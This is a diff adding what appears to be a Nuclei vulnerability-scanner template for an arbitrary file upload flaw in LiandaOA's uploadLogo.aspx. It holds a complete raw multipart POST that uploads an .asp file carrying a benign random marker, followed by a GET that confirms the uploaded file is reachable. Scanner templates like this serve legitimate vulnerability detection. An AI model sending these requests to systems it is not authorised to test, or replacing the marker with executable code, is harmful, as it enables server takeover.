@@ -1,0 +1,50 @@
+id: poc-yaml-lianda-oa-uploadlogo-aspx-anyfile-upload
+info:
+  name: LiandaOA uploadLogo.aspx Arbitrary File Upload Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: file-upload, critical
+
+variables:
+  t1: '{{rand_text_alpha(4)}}'
+  t2: '{{base64(t1)}}'
+
+http:
+- raw:
+    - |
+        POST /Hosp_Portal/uploadLogo.aspx HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=------------------------OFkXeLxrBXIgRvlvsZIFniBVqbRidnzdYBsZRzuA
+
+        --------------------------OFkXeLxrBXIgRvlvsZIFniBVqbRidnzdYBsZRzuA
+        Content-Disposition: form-data; name="DesignId"
+
+        1
+        --------------------------OFkXeLxrBXIgRvlvsZIFniBVqbRidnzdYBsZRzuA
+        Content-Disposition: form-data; name="Filedata"; filename="{{t1}}.asp"
+
+        {{t2}}
+        --------------------------OFkXeLxrBXIgRvlvsZIFniBVqbRidnzdYBsZRzuA--
+  matchers-condition: and
+  matchers:
+    - type: status
+      status:
+        - 200
+    - type: word
+      part: body
+      words:
+        - '{{t1}}'
+
+- raw:
+    - |
+        GET /Hosp_Portal/Logo/{{t1}}.asp HTTP/1.1
+        Host: {{Hostname}}
+  matchers-condition: and
+  matchers:
+    - type: status
+      status:
+        - 200
+    - type: word
+      part: body
+      words:
+        - '{{t2}}'
